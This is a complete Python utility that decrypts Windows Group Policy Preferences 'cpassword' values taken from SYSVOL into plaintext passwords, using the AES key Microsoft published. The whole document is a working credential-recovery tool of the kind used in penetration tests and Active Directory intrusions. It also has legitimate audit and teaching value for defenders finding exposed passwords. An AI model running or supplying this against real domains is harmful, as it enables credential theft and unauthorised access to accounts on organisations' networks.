#!/usr/bin/env python3


"""
decode Sysvol cpassword using the shared secred key
Just copy the cpassword value as 1st argument

Regards,
Alban Daumer (https://github.com/DelTa-B)

"""

import sys
import base64
from Crypto.Cipher import AES


def usage():
	print("Usage: %s cpassword " % sys.argv[0])
	exit(-1)

if (len(sys.argv) != 2):
	print("wrong number of args")
	usage()



cpassword = sys.argv[1]
cpassword += "==="
if len(cpassword) % 4:
	cpassword = cpassword[0:-(len(cpassword)%4)]

# this is the sysvol key published by Microsoft here: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
key=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
key_display = ':'.join("{:02x}".format(c) for c in (key))

#uncomment for debug info
#print ("\tkey={}".format(key_display))
#print ("\tcpassword={}".format(cpassword))
AES = AES.new(key, AES.MODE_CBC, ("\x00" *16).encode("utf8"))

cipher = base64.b64decode(cpassword)
plain = AES.decrypt(cipher)
pad_len = plain[-1]
utf_16_password = plain[:-pad_len]

print("password is, within quote marks:\"{}\"".format(utf_16_password.decode('utf-16le')))
